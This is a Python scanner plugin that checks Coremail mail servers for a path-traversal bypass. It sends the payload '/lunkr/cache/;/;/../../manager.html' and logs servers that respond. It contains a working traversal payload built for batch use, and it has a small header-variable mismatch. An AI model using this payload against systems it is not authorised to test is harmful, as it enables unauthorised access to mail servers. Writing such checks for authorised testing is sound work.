#! /usr/bin/python3
# -*- encoding: utf-8 -*-
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
import requests,urllib3
from pub.com.output import OutPutFile
urllib3.disable_warnings()

class Coremail_Dir_ByPass_Scan:
    def __init__(self):
        self.header = None
        self.proxy = None

    def send_payload(self,url):
        url2 = url + '/lunkr/cache/;/;/../../manager.html'
        try:
            req = requests.get(url2, timeout=3,verify=self.verify,proxies=self.proxy,headers=self.header)
            if req.status_code == 200 and url2 == req.url:
                OutPrintInfoSuc("Coremail", f"存在Coremail邮箱系统路径穿越漏洞{url2}")

                if self.batch:
                    OutPutFile("coremail_dir_read.txt",f"存在Coremail邮箱系统路径穿越漏洞{url2}")
            else:
                if not self.batch:
                    OutPrintInfo("Coremail", f"不存在Coremail邮箱系统路径穿越漏洞")
        except Exception:
            if not self.batch:
                OutPrintInfo("Coremail", "不存在Coremail邮箱系统路径穿越漏洞")

    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.verify = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Coremail", "开始检测Coremail邮箱系统路径穿越漏洞...")
        self.send_payload(url)
        if not self.batch:
            OutPrintInfo("Coremail", "Coremail邮箱系统路径穿越漏洞检测结束")
